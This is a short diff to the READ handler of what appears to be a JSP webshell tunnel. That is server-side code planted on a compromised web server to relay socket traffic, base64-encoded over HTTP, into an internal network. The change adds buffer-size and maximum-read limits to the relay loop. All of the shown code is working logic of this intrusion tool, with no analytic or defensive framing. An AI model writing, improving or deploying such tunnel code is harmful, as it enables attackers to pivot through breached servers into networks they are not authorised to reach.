@@ -212,14 +212,19 @@
         } else if (cmd.compareTo("READ") == 0){
             SocketChannel socketChannel = (SocketChannel)application.getAttribute(mark);
             try{
-                ByteBuffer buf = ByteBuffer.allocate(513);
+                ByteBuffer buf = ByteBuffer.allocate(READBUF);
                 int bytesRead = socketChannel.read(buf);
+                int maxRead = MAXREADSIZE;
+                int readLen = 0;
                 while (bytesRead > 0){
                     byte[] data = new byte[bytesRead];
                     System.arraycopy(buf.array(), 0, data, 0, bytesRead);
                     out.write(b64en(data));
                     out.flush();
                     ((java.nio.Buffer)buf).clear();
+                    readLen += bytesRead;
+                    if (bytesRead < READBUF || readLen >= maxRead)
+                        break;
                     bytesRead = socketChannel.read(buf);
                 }
                 response.setHeader("X-STATUS", "OK");
